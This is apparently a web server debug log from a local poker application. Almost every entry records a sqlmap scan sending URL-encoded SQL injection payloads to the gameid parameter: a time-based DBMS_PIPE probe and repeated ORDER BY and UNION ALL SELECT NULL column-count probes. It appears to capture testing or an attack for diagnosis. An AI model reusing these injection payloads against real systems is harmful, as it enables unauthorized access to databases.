[D 180302 142142975]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%208023%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28120%29%7C%7CCHR%28104%29%7C%7CCHR%2879%29%2C5%29', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142145419]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%208023%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28120%29%7C%7CCHR%28104%29%7C%7CCHR%2879%29%2C5%29--%20Zzqm', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142147946]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20ORDER%20BY%201--%20wKAm', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142150146]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL--%20suCF', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142152510]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20gIFi', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142154913]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20qSml', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142157269]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20IlTZ', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142159580]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20WjgH', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142202402]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20YHee', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142204975]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20RjdE', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142207510]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20bbqx', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142210479]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20yuYX', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142213290]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20TxHg', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142215862]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20ORDER%20BY%201--%20mzVG', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142218461]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL--%20HKTv', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142220786]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20oqzA', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142223594]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20fDiI', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142226048]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20kUNJ', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142228200]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20RgLA', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142230732]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20basg', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142232504]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Connection': 'upgrade', 'Host': 'localhost:8008', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5'})
[D 180302 142233838]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20eRJA', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142236017]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20GpEA', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142238625]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20vFLD', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142241208]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20fVkF', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142243930]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20ORDER%20BY%201--%20DUUP', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142244420]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'upgrade', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36', 'Host': 'localhost:8008', 'Upgrade-Insecure-Requests': '1'})
[D 180302 142246465]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL--%20WIMg', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142248785]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20XxeG', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142251129]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20OPmQ', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142253416]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20dpVm', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142255569]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20LXwb', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142257968]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20EjYE', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142300140]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20Jgih', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142302310]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20anol', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142304795]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20xqdY', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142306918]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20ybTL', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142309126]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20ORDER%20BY%201--%20aOFE', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142311435]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL--%20DTAm', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142313935]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20BORd', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142316184]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20qHQE', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142318548]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20KfPx', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142320942]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20vrza', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142323347]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20CYeG', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142325991]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20SPDJ', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142328297]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20pqNm', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142330447]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20hOwU', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142332560]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20sJof', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142334663]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20ORDER%20BY%201--%20tdFX', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142336946]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20UNION%20ALL%20SELECT%20NULL--%20HjVB', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142339294]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20zRrN', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142341433]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20eycM', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142343493]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20zDJa', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142345738]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20bIzn', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
